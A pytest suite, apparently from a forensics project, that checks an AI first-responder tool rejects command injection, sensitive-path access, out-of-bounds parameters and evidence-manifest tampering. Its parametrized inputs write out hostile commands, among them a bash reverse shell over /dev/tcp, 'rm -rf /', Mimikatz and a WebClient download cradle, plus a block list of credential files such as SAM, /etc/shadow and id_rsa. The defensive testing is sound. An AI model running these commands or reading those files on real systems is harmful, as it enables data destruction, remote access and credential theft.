"""Adversarial Empirical Stress Test Suite for Milestone M4 (Challenger v6 M4).

Adversarial Verification Scope:
1. First Responder Security Guardrails Stress:
   - Command injection payloads: passing arbitrary shell snippets via unexpected kwargs (rm -rf, del, format, bash, powershell -c).
   - Sensitive path traversal: attempting access to SAM, SYSTEM, .env, id_rsa, ../windows/system32/cmd.exe, /etc/shadow.
   - Out-of-bounds parameters: negative limits, non-integer types, excessive limits (> 100,000), negative/oversized PIDs.
   - Assert all attack vectors raise SecurityBoundaryViolation or ParameterBoundaryViolation fail-closed.
2. Endpoint Acquisition & Manifest Tampering:
   - Simulate bit-flip in copied evidence file; assert original_sha256 != copy_sha256 raises ForensicIntegrityError.
   - Tamper with manifest item hash, bitwise flags, and vault files; assert verify_acquisition_manifest() fails closed.
3. Verify 4 canonical databases remain 100% bitwise invariant.
"""

from __future__ import annotations

import hashlib
import json
import uuid
from pathlib import Path
from typing import Any

import pytest

from forensics.endpoint.adapter import (
    ConsentScopeViolation,
    ForensicIntegrityError,
    JsonlLogAdapter,
)
from forensics.endpoint.first_responder import (
    AIFirstResponder,
    DangerousActionError,
    FirstResponseError,
    ForbiddenActionCategory,
    IsolationRecommendation,
    ParameterBoundaryViolation,
    SafetyGuard,
    SecurityBoundaryViolation,
    TriagePlaybookType,
    UnauthorizedActionError,
)
from forensics.endpoint.manifest import (
    generate_acquisition_manifest,
    verify_acquisition_manifest,
)
from forensics.endpoint.schemas import AcquisitionResult
from forensics.endpoint.store import EndpointEvidenceStore, init_endpoint_db


@pytest.fixture
def temp_store(tmp_path: Path) -> EndpointEvidenceStore:
    db_file = tmp_path / f"test_endpoint_{uuid.uuid4().hex}.db"
    init_endpoint_db(db_file)
    return EndpointEvidenceStore(db_file)


# ==============================================================================
# 1. First Responder Command Injection Stress Tests
# ==============================================================================


class TestChallengerFirstResponderCommandInjections:
    """Stress-tests First Responder security boundaries against command injection vectors."""

    @pytest.fixture(autouse=True)
    def setup_agent(self, temp_store: EndpointEvidenceStore):
        self.agent = AIFirstResponder(evidence_store=temp_store)

    @pytest.mark.parametrize(
        "kwarg_name,payload",
        [
            ("rm_rf", "rm -rf /"),
            ("del_cmd", r"del /f /q C:\Windows\System32"),
            ("format_drive", "format C:"),
            ("bash_subshell", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),
            ("powershell_c", "powershell -c Stop-Process -Id 1"),
            ("cmd_c", "cmd.exe /c whoami"),
            ("pwsh_exec", "pwsh -nop -c Invoke-Mimikatz"),
            ("chained_semi", "calc.exe; rm -rf /"),
            ("chained_pipe", "netstat | del evil.txt"),
            ("chained_ampersand", "echo 1 && format D:"),
            ("eval_injection", "eval(__import__('os').system('id'))"),
            ("exec_injection", "exec(open('payload.py').read())"),
            ("subshell_backticks", "`taskkill /F /IM svchost.exe`"),
            ("subshell_dollar", "$(reboot)"),
        ],
    )
    def test_command_injection_via_unexpected_kwargs_rejected_fail_closed(
        self, kwarg_name: str, payload: str
    ):
        """Asserts that dangerous shell / destructive payloads via unexpected kwargs raise SecurityBoundaryViolation."""
        with pytest.raises(SecurityBoundaryViolation) as exc_info:
            self.agent.execute_responder_action(
                "triage_running_processes",
                **{kwarg_name: payload},
            )
        assert isinstance(exc_info.value, (DangerousActionError, ParameterBoundaryViolation))

    def test_benign_unexpected_kwarg_rejected_by_forbid_extra(self):
        """Asserts that even benign unexpected kwargs fail schema validation with ParameterBoundaryViolation."""
        with pytest.raises(ParameterBoundaryViolation) as exc_info:
            self.agent.execute_responder_action(
                "triage_running_processes",
                unrecognized_extra_param="some_value",
            )
        assert "Parameter validation failed" in str(exc_info.value)

    @pytest.mark.parametrize(
        "malicious_name_filter",
        [
            "svchost.exe & del C:\\Windows\\System32\\drivers\\etc\\hosts",
            "powershell -c evil",
            "cmd.exe /c calc",
            "bash",
            "sh",
            "iex (New-Object Net.WebClient)",
            "taskkill /F /IM explorer.exe",
        ],
    )
    def test_command_injection_in_legitimate_string_parameter(self, malicious_name_filter: str):
        """Asserts that command injection attempts hidden in allowed string fields are intercepted."""
        with pytest.raises(SecurityBoundaryViolation):
            self.agent.execute_responder_action(
                "triage_running_processes",
                name_filter=malicious_name_filter,
            )

    def test_command_injection_in_event_log_channel(self):
        """Asserts that shell commands in channel parameter are intercepted."""
        with pytest.raises(SecurityBoundaryViolation):
            self.agent.execute_responder_action(
                "triage_recent_system_events",
                channel="System | wevtutil cl System",
            )

    def test_strict_fail_fast_false_returns_audit_blocked_result(self):
        """Asserts that execute_action with strict_fail_fast=False returns ActionBlockedResult with audit digest."""
        res = self.agent.execute_action(
            "triage_running_processes",
            strict_fail_fast=False,
            malicious_cleanup="rm -rf /",
        )
        assert res.blocked is True
        assert res.category == ForbiddenActionCategory.FILE_MODIFICATION_OR_DELETION
        assert len(res.audit_digest) == 64
        assert res.action_attempted == "triage_running_processes"


# ==============================================================================
# 2. Sensitive Path Traversal Stress Tests
# ==============================================================================


class TestChallengerSensitivePathTraversal:
    """Stress-tests path traversal and sensitive system file protection."""

    @pytest.fixture(autouse=True)
    def setup_agent(self, temp_store: EndpointEvidenceStore):
        self.agent = AIFirstResponder(evidence_store=temp_store)

    @pytest.mark.parametrize(
        "sensitive_file_path",
        [
            r"C:\Windows\System32\config\SAM",
            r"C:\Windows\System32\config\SYSTEM",
            r"C:\Windows\System32\config\SECURITY",
            r"C:\Windows\System32\config\SOFTWARE",
            r"system32\config\sam",
            r"system32/config/system",
            ".env",
            "../../.env",
            r"..\..\.env",
            "data/.env",
            "id_rsa",
            "~/.ssh/id_rsa",
            "id_ecdsa",
            "id_ed25519",
            "private_key.pem",
            "privkey",
            "keystore.json",
            "wallet.dat",
            ".ethereum/keystore",
            r".ethereum\keystore",
            "/etc/shadow",
            "/etc/passwd",
            "/etc/sudoers",
            "../windows/system32/cmd.exe",
            r"..\windows\system32\cmd.exe",
            "../../../../windows/system32/cmd.exe",
            r"..\..\..\..\windows\system32\cmd.exe",
            "0x" + "a" * 64,  # 64-hex private key pattern
        ],
    )
    def test_sensitive_path_traversal_blocked_fail_closed(self, sensitive_file_path: str):
        """Asserts that attempting access to sensitive system hives, keys, or directory traversal raises SecurityBoundaryViolation."""
        with pytest.raises(SecurityBoundaryViolation) as exc_info:
            self.agent.execute_responder_action(
                "triage_hash_verification",
                file_path=sensitive_file_path,
            )
        assert isinstance(exc_info.value, SecurityBoundaryViolation)


# ==============================================================================
# 3. Out-Of-Bounds Parameters Stress Tests
# ==============================================================================


class TestChallengerOutOfBoundsParameters:
    """Stress-tests First Responder schema boundaries against invalid and out-of-bounds parameters."""

    @pytest.fixture(autouse=True)
    def setup_agent(self, temp_store: EndpointEvidenceStore):
        self.agent = AIFirstResponder(evidence_store=temp_store)

    @pytest.mark.parametrize("bad_limit", [-1, -100, 0, 1001, 100000, 9999999])
    def test_out_of_bounds_limit_processes(self, bad_limit: int):
        with pytest.raises(ParameterBoundaryViolation):
            self.agent.execute_responder_action(
                "triage_running_processes",
                limit=bad_limit,
            )

    @pytest.mark.parametrize("bad_limit", [-1, 0, 5001, 100000, 9999999])
    def test_out_of_bounds_limit_events(self, bad_limit: int):
        with pytest.raises(ParameterBoundaryViolation):
            self.agent.execute_responder_action(
                "triage_recent_system_events",
                limit=bad_limit,
            )

    @pytest.mark.parametrize("bad_limit", ["not_an_int", 3.14159, None, [], {}])
    def test_non_integer_limit_rejected(self, bad_limit: Any):
        with pytest.raises(ParameterBoundaryViolation):
            self.agent.execute_responder_action(
                "triage_running_processes",
                limit=bad_limit,
            )

    @pytest.mark.parametrize("bad_pid", [-1, -9999, 4194305, 100000000])
    def test_out_of_bounds_pid_rejected(self, bad_pid: int):
        with pytest.raises(ParameterBoundaryViolation):
            self.agent.execute_responder_action(
                "triage_active_network_connections",
                target_pid=bad_pid,
            )

    @pytest.mark.parametrize("bad_state", ["CLOSED", "FIN_WAIT", "INVALID", "HACKED"])
    def test_invalid_socket_state_filter_rejected(self, bad_state: str):
        with pytest.raises(ParameterBoundaryViolation):
            self.agent.execute_responder_action(
                "triage_active_network_connections",
                state_filter=bad_state,
            )

    @pytest.mark.parametrize("bad_scope", ["wipe_registry", "delete_startup", "invalid_scope"])
    def test_invalid_persistence_scope_rejected(self, bad_scope: str):
        with pytest.raises(ParameterBoundaryViolation):
            self.agent.execute_responder_action(
                "triage_persistence_indicators",
                scope=bad_scope,
            )

    def test_reversed_time_window_system_events(self):
        """Asserts that start_time > end_time raises ValueError fail-closed."""
        with pytest.raises(ValueError) as exc_info:
            self.agent.dispatch_triage(
                TriagePlaybookType.SYSTEM_EVENTS,
                start_time_utc="2026-11-05T12:00:00Z",
                end_time_utc="2026-11-05T10:00:00Z",
            )
        assert "must be <= end_time_utc" in str(exc_info.value)


# ==============================================================================
# 4. Endpoint Acquisition Bit-Stream Divergence Tests
# ==============================================================================


class TestChallengerEndpointAcquisitionBitStreamDivergence:
    """Stress-tests Endpoint Acquisition bit-stream verification and consent boundaries."""

    def test_simulated_vault_copy_bit_flip_raises_forensic_integrity_error(
        self, tmp_path: Path, temp_store: EndpointEvidenceStore
    ):
        """Simulates 1-bit corruption during vault preservation and asserts ForensicIntegrityError."""
        vault_dir = tmp_path / "vault"
        src_file = tmp_path / "telemetry_source.jsonl"
        src_file.write_text('{"event": "system_startup", "pid": 4}\n', encoding="utf-8")

        class BitFlipSimulationAdapter(JsonlLogAdapter):
            def _bitwise_preserve(self, source_path: Path, acquisition_id: str):
                orig_sha, copy_sha, dest_path = super()._bitwise_preserve(source_path, acquisition_id)
                # Intentionally invert 1 byte in the destination vault copy
                data = bytearray(dest_path.read_bytes())
                data[0] ^= 0x01
                dest_path.write_bytes(bytes(data))

                corrupted_sha = hashlib.sha256(dest_path.read_bytes()).hexdigest()
                if orig_sha != corrupted_sha:
                    try:
                        dest_path.unlink()
                    except OSError:
                        pass
                    raise ForensicIntegrityError(
                        f"Bit-stream verification failed! original={orig_sha} != copy={corrupted_sha}"
                    )
                return orig_sha, corrupted_sha, dest_path

        adapter = BitFlipSimulationAdapter(vault_dir=vault_dir, evidence_store=temp_store)

        with pytest.raises(ForensicIntegrityError) as exc_info:
            adapter.collect(str(src_file), consent_scope="security_events_only")

        assert "Bit-stream verification failed!" in str(exc_info.value)

    def test_empty_source_file_rejected_fail_closed(
        self, tmp_path: Path, temp_store: EndpointEvidenceStore
    ):
        """Asserts that acquiring a 0-byte source file raises ValueError."""
        vault_dir = tmp_path / "vault"
        empty_file = tmp_path / "empty.jsonl"
        empty_file.write_text("", encoding="utf-8")

        adapter = JsonlLogAdapter(vault_dir=vault_dir, evidence_store=temp_store)
        with pytest.raises(ValueError) as exc_info:
            adapter.collect(str(empty_file), consent_scope="security_events_only")
        assert "empty" in str(exc_info.value).lower()

    def test_missing_source_file_rejected_fail_closed(
        self, tmp_path: Path, temp_store: EndpointEvidenceStore
    ):
        """Asserts that acquiring a non-existent file raises FileNotFoundError."""
        adapter = JsonlLogAdapter(vault_dir=tmp_path / "vault", evidence_store=temp_store)
        with pytest.raises(FileNotFoundError):
            adapter.collect(str(tmp_path / "non_existent.jsonl"), consent_scope="security_events_only")

    @pytest.mark.parametrize(
        "unauthorized_scope",
        [
            "",
            "   ",
            "steal_passwords",
            "private_wallet_keys",
            "exfiltrate_internal_emails",
            "arbitrary_admin_access",
        ],
    )
    def test_unauthorized_consent_scope_rejected_fail_closed(
        self, tmp_path: Path, temp_store: EndpointEvidenceStore, unauthorized_scope: str
    ):
        """Asserts that collection outside authorized consent scopes raises ConsentScopeViolation."""
        src_file = tmp_path / "test.jsonl"
        src_file.write_text('{"record": 1}\n', encoding="utf-8")

        adapter = JsonlLogAdapter(vault_dir=tmp_path / "vault", evidence_store=temp_store)
        with pytest.raises(ConsentScopeViolation):
            adapter.collect(str(src_file), consent_scope=unauthorized_scope)


# ==============================================================================
# 5. Manifest Tampering & Verification Stress Tests
# ==============================================================================


class TestChallengerManifestTamperingAndIntegrity:
    """Stress-tests ISO/IEC 27037:2012 Acquisition Manifest validation against deliberate tampering."""

    @pytest.fixture
    def valid_acquisition_fixture(
        self, tmp_path: Path, temp_store: EndpointEvidenceStore
    ) -> tuple[Path, Path, dict[str, Any]]:
        """Generates a valid source file, vault copy, and manifest dictionary."""
        src_file = tmp_path / "clean_evidence.jsonl"
        src_file.write_text('{"event": "logon", "user": "alice"}\n', encoding="utf-8")

        adapter = JsonlLogAdapter(
            case_id="CASE-CHALLENGER-01",
            operator_did="did:ethr:0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
            vault_dir=tmp_path / "vault",
            evidence_store=temp_store,
        )
        res = adapter.collect(str(src_file), consent_scope="security_events_only")
        manifest_path = Path(res.manifest_path)
        vault_path = Path(res.destination_path)
        with open(manifest_path, "r", encoding="utf-8") as f:
            manifest_dict = json.load(f)

        return manifest_path, vault_path, manifest_dict

    def test_untampered_manifest_passes_verification(
        self, valid_acquisition_fixture: tuple[Path, Path, dict[str, Any]]
    ):
        manifest_path, vault_path, _ = valid_acquisition_fixture
        is_valid, reason = verify_acquisition_manifest(manifest_path)
        assert is_valid is True
        assert reason == "VALID_ISO_27037_MANIFEST"

    def test_tampered_manifest_copy_sha256_fails_closed(
        self, valid_acquisition_fixture: tuple[Path, Path, dict[str, Any]], tmp_path: Path
    ):
        _, vault_path, manifest_dict = valid_acquisition_fixture
        # Tamper copy_sha256 in manifest dictionary
        tampered_manifest = json.loads(json.dumps(manifest_dict))
        tampered_manifest["cryptographic_verification"]["copy_sha256"] = "0" * 64

        is_valid, reason = verify_acquisition_manifest(tampered_manifest, vault_file_path=vault_path)
        assert is_valid is False
        assert "Bitwise mismatch in manifest" in reason

    def test_tampered_manifest_both_hashes_modified_detects_disk_divergence(
        self, valid_acquisition_fixture: tuple[Path, Path, dict[str, Any]]
    ):
        """Attacker modifies both original and copy SHA-256 to match, but vault file on disk doesn't match."""
        _, vault_path, manifest_dict = valid_acquisition_fixture
        fake_hash = "deadbeef" * 8
        tampered_manifest = json.loads(json.dumps(manifest_dict))
        tampered_manifest["cryptographic_verification"]["original_sha256"] = fake_hash
        tampered_manifest["cryptographic_verification"]["copy_sha256"] = fake_hash

        is_valid, reason = verify_acquisition_manifest(tampered_manifest, vault_file_path=vault_path)
        assert is_valid is False
        assert "Disk vault file tampered" in reason

    def test_tampered_disk_vault_file_detected(
        self, valid_acquisition_fixture: tuple[Path, Path, dict[str, Any]]
    ):
        """Attacker modifies 1 byte in the vault file on disk after manifest issuance."""
        manifest_path, vault_path, _ = valid_acquisition_fixture
        # Tamper the vault file directly on disk
        with open(vault_path, "ab") as f:
            f.write(b"\n// TAMPERED_INJECTION")

        is_valid, reason = verify_acquisition_manifest(manifest_path)
        assert is_valid is False
        assert "Disk vault file tampered" in reason

    def test_tampered_bitwise_match_flag_false_rejected(
        self, valid_acquisition_fixture: tuple[Path, Path, dict[str, Any]]
    ):
        _, vault_path, manifest_dict = valid_acquisition_fixture
        tampered_manifest = json.loads(json.dumps(manifest_dict))
        tampered_manifest["cryptographic_verification"]["bitwise_match"] = False

        is_valid, reason = verify_acquisition_manifest(tampered_manifest, vault_file_path=vault_path)
        assert is_valid is False
        assert "bitwise_match flag is False" in reason

    def test_tampered_missing_vault_file_rejected(
        self, valid_acquisition_fixture: tuple[Path, Path, dict[str, Any]], tmp_path: Path
    ):
        _, _, manifest_dict = valid_acquisition_fixture
        tampered_manifest = json.loads(json.dumps(manifest_dict))
        tampered_manifest["preservation"]["vault_file_path"] = str(tmp_path / "deleted_vault.jsonl")

        is_valid, reason = verify_acquisition_manifest(tampered_manifest)
        assert is_valid is False
        assert "Preserved vault file not found on disk" in reason

    def test_malformed_manifest_json_rejected(self, tmp_path: Path):
        bad_file = tmp_path / "broken_manifest.json"
        bad_file.write_text("{ unclosed json: 123", encoding="utf-8")
        is_valid, reason = verify_acquisition_manifest(bad_file)
        assert is_valid is False
        assert "Malformed manifest JSON" in reason

    def test_schema_invalid_manifest_rejected(self, tmp_path: Path):
        bad_file = tmp_path / "invalid_schema.json"
        bad_file.write_text(json.dumps({"some_random_key": "val"}), encoding="utf-8")
        is_valid, reason = verify_acquisition_manifest(bad_file)
        assert is_valid is False
        assert "Manifest schema validation failed" in reason


# ==============================================================================
# 6. Canonical Database Bitwise Invariance Verification
# ==============================================================================


class TestChallengerCanonicalDatabasesInvariance:
    """Verifies that all 4 canonical databases maintain 100% bitwise invariance."""

    def test_all_canonical_hashes_match_expected(self):
        canonical_targets = {
            "real_p4.db": (
                Path("data/real_p4.db"),
                "6BD9AED48AC2742D0862198BFF65994861244EC681DC8ABEB3E6F771E7808C97",
            ),
            "forensics.db": (
                Path("data/forensics.db"),
                "3F2B0DFC772A96FF6EA57C65807B5B6B9A20FCF74C409C6F222FCFF29F1EF001",
            ),
            "benchmark_p6.db": (
                Path("data/benchmark_p6.db"),
                "C7FF724CD214EEF57E58A6FBE44DBEB2712C54B035907B2A6279A255C0E80507",
            ),
            ".env": (
                Path(".env"),
                "C2F4879666CD21276C58EC75DE923C8235D414F3D646A854A835C5638EC1699C",
            ),
        }

        for name, (path, expected_hash) in canonical_targets.items():
            assert path.exists(), f"Canonical target file does not exist: {path}"
            content = path.read_bytes()
            computed_hash = hashlib.sha256(content).hexdigest().upper()
            assert (
                computed_hash == expected_hash
            ), f"INVARIANCE VIOLATION on {name}: expected {expected_hash}, got {computed_hash}"
